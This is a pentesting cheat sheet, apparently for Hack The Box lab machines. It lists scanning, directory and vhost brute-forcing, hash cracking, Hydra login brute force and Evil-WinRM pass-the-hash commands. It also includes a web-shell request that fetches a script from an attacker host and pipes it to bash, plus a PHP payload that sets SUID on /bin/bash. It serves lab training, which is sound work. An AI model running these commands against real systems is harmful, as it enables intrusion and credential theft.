## 🧰 Frequently Used Pentesting Commands

### 🔍 Enumeration
```bash
nmap -sC -sV -p- --min-rate 1000 10.129.54.238 -v
```

### 🌐 Virtual Host & Directory Discovery
```bash
gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
gobuster dir --url http://ignition.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### ☁️ AWS S3 Bucket Enumeration
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

### 🐚 Shell & Reverse Shell
```bash
nc -nvlp 1337
python3 -m http.server 8000
```

### 🪝 Web-based Reverse Shell Execution
```bash
http://thetoppers.htb/shell.php?cmd=curl%<attacking machine ip>:8000/shell.sh|bash
```

### 🕒 Time Synchronization (Useful for Kerberos/AD)
```bash
ntpdate pool.ntp.org  # Sync system clock with NTP server to avoid time skew issues
```

### 🔐 Evil-WinRM Access
```bash
evil-winrm -i administrator.htb -u administrator -H <NTLM_hash>   # Login using NTLM hash
evil-winrm -i administrator.htb -u administrator -p <password>    # Login using password

### 🔓 Cracking Hashes with Hashcat
```bash
# Auto-detect hash mode (not recommended for reliability)
hashcat -a 0 hash.txt /home/kali/Documents/rockyou.txt

# Specified mode (Apache $apr1$ MD5)
hashcat -m 1600 -a 0 hash.txt /home/kali/Documents/rockyou.txt
```

### ⚡ Privilege Escalation via SUID Bash (PHP RCE)
```php
<?php exec("chmod +s /bin/bash"); ?>
```
Then on the target:
```bash
/bin/bash -p  # Run with elevated privileges if SUID is set
```

### 🛠️ Hydra Brute-Force Examples
```bash
# SSH login
hydra -L usernames.txt -P password.txt 10.129.226.117 ssh 

# HTTP Basic Auth Brute Force
hydra -L users.txt -P passwords.txt 10.129.54.238 http-get /admin
```

### 📂 FTP Enumeration with Anonymous Login
```bash
# Check FTP banner and anonymous login
ftp 10.129.54.238

# If you see code 230:
# 230 Login successful.
# You have access to browse and download/upload if permitted

# Listing files
ls

# Downloading a file
get filename.txt
```

### 🔐 SSH Usage Basics
```bash
# Connect to SSH server
ssh username@10.129.226.117

# Use custom port (if not default 22)
ssh -p 2222 username@10.129.226.117

# Use private key for authentication
ssh -i /path/to/private_key.pem username@10.129.226.117

# Run a single command over SSH
ssh username@10.129.226.117 'ls -la /var/www/html'
```

### 📡 Checking Open Ports with `ss`
```bash
# List all listening TCP ports
ss -tln

# Breakdown:
# -t : TCP sockets
# -l : Listening sockets
# -n : Show port numbers (no DNS resolution)

# Example output:
# State     Recv-Q     Send-Q         Local Address:Port        Peer Address:Port
# LISTEN    0          128            0.0.0.0:22                0.0.0.0:*
```